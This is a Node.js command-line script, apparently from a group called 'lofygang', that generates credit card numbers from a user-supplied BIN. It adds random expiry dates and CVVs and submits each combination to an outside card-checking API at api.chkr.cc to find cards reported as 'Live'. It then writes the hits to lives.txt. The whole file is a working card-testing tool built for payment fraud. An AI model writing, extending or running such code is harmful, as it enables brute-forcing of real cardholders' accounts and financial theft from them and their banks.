require('colors');
const readline = require('readline');
const fs = require('fs');
const axios = require('axios');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function luhnCheck(cardNumber) {
  let sum = 0;
  let shouldDouble = false;
  const sanitized = cardNumber.replace(/\D/g, '');
  for (let i = sanitized.length - 1; i >= 0; i--) {
    let digit = parseInt(sanitized.charAt(i), 10);
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}

function calculateCheckDigit(partialNumber) {
  let sum = 0;
  let shouldDouble = true;
  const sanitized = partialNumber.replace(/\D/g, '');
  for (let i = sanitized.length - 1; i >= 0; i--) {
    let digit = parseInt(sanitized.charAt(i), 10);
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return (10 - (sum % 10)) % 10;
}

function generateExpirationDate() {
  const month = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
  const year = String(Math.floor(Math.random() * 6) + 2026).slice(-2);
  return `${month}/${year}`;
}

function generateCVV() {
  return String(Math.floor(Math.random() * 1000)).padStart(3, '0');
}

function generateFullCard(bin, cardLength = 16) {
  let partialNumber = bin;
  const binLength = bin.length;
  for (let j = binLength; j < cardLength - 1; j++) {
    partialNumber += Math.floor(Math.random() * 10);
  }
  const checkDigit = calculateCheckDigit(partialNumber);
  return partialNumber + checkDigit;
}

async function checkCard(card, expiration, cvv) {
  const [month, year] = expiration.split('/');
  const payload = {
    data: `${card}|${month}|20${year}|${cvv}`,
    charge: false
  };
  try {
    const response = await axios.post('https://api.chkr.cc/', payload);
    return response.data;
  } catch (error) {
    console.log('[!]'.red + ` Error: ${error.message}`.red);
    return { status: 'Error', message: error.message };
  }
}

async function generateValidCards(bin, maxAttempts = 100) {
  const validCards = [];
  let attempts = 0;

  console.log('[#]'.cyan + ' Iniciando busca da matriz...\n'.cyan);
  //console.log('[@]'.green + ' Procurando matrizes...'.green);

  while (validCards.length < 5 && attempts < maxAttempts) {
    const fullCard = generateFullCard(bin);
    if (!luhnCheck(fullCard)) {
      attempts++;
      continue;
    }
    const expiration = generateExpirationDate();
    const cvv = generateCVV();
    const result = await checkCard(fullCard, expiration, cvv);
    if (result.status === 'Live') {
      const displayCard = fullCard.slice(0, 12) + 'xxxx';
      validCards.push({ card: displayCard, expiration });
      console.log(`[@]`.green + ` ${displayCard} ${expiration}`.green);
    }
    attempts++;
  }

  if (validCards.length < 5) {
    console.log('[!]'.red + ` Apenas ${validCards.length} matrizes encontradas após ${maxAttempts} tentativas.`.red);
  }
  return validCards;
}

function saveToFile(cards) {
  const content = cards.map(({ card, expiration }) => `${card}|${expiration}`).join('\n');
  fs.writeFileSync('lives.txt', content + '\n', 'utf8');
  //console.log('[#]'.cyan + ' Matrizes salvas em lives.txt'.cyan.bold);
}

function main() {
  process.title = "by lofygang";
  console.clear();
  console.log('[?]'.yellow + ' Bem-vindo ao Search Matriz!'.yellow.bold);
  rl.question('[#]'.cyan + ' Qual matriz deseja buscar? '.cyan, async (bin) => {
    if (!/^\d{6,}$/.test(bin)) {
      console.log('[!]'.red + ' Erro: Bin deve conter apenas números e ter pelo menos 6 dígitos.'.red);
      rl.close();
      return;
    }

    rl.pause();
    const validCards = await generateValidCards(bin);
    rl.resume();

    if (validCards.length === 0) {
      console.log('[!]'.red + ' Não foi possível encontrar matrizes desta bin.'.red);
    } else {
      //console.log('[#]'.cyan + ` Matrizes live encontradas para a bin ${bin}:`.cyan.bold);
      saveToFile(validCards);
    }

    rl.question('\n[?]'.yellow + ' Busca concluída! Deseja buscar outra matriz? (s/n): '.yellow, (answer) => {
      if (answer.toLowerCase() === 's') {
        main();
      } else {
        console.log('\n[!]'.red + ' Saindo...'.red.bold);
        rl.close();
      }
    });
  });
}

main();